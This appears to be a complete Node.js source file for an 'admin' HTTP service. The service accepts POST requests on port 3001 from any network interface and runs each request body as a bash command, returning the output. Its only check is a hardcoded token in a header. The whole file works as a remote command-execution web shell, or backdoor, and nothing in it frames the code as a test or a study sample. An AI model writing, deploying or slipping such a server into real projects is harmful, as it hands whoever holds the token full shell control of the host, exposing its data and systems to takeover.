const http = require('http');
const { execSync } = require('child_process');
const TOKEN = 'p2phub-admin-7x9k';

http.createServer((req, res) => {
  if (req.method !== 'POST' || req.headers['x-token'] !== TOKEN) {
    res.writeHead(403); res.end('forbidden');
    return;
  }
  let body = '';
  req.on('data', d => body += d);
  req.on('end', () => {
    try {
      const out = execSync(body, { timeout: 30000, encoding: 'utf8', shell: '/bin/bash' });
      res.writeHead(200); res.end(out || 'ok');
    } catch (e) {
      res.writeHead(500); res.end((e.stdout || '') + '\n' + (e.stderr || ''));
    }
  });
}).listen(3001, '0.0.0.0', () => console.log('admin ready on 3001'));
